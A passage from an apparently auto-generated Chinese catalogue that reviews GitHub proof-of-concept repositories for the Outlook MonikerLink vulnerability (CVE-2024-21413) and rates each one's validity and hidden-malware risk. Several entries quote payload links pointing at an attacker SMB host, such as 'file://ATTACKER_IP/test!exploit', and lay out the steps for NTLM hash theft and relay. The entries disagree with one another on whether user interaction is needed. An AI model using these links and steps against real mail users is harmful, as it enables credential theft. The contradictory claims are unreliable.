**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

